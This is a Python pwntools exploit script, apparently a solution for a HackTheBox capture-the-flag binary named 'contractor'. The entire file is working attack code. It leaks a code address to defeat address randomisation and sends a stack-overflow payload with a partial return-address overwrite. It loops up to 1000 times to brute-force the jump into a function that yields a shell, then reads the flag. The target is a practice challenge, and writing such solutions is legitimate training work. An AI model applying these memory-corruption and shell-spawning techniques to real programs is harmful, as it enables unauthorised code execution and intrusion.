from pwn import *

context.binary = elf = ELF('contractor')
context.log_level = 'error'
for i in range(1000):
    elf.address = 0
    pr = process()

    pr.sendline(b'Ved')
    pr.sendline(b'my_purpose')
    pr.sendline(b'12345678')
    pr.send(b'a'*0x10)
    pr.recvuntil(b'a'*0x10)
    rip_leak = pr.recvuntil(b'\n\n+')[:-3]
    rip_leak = int.from_bytes(rip_leak, 'little')
    
    elf.address = rip_leak - elf.symbols['__libc_csu_init']
    print(hex(elf.address))

    pr.recvuntil(b'> ')
    pr.sendline(b'4')

    pr.recvuntil(b'at: ')
    pr.sendline(b'A'*0x18+p64(0)+b'\xf0')
    pr.recvuntil(b'> ')
    pr.sendline(b'no')
    pr.recvuntil(b'> ')

    pr.sendline(b'4')
    # pr.interactive()

    pr.sendline(p64(elf.symbols['contract']))
    pr.recvuntil(b'lad!\n\n')
    
    pr.sendline(b'cat flag.txt')
    ln = pr.recvall(timeout=1)
    if b'HTB' in ln:
        print(ln)
        break
    pr.close()
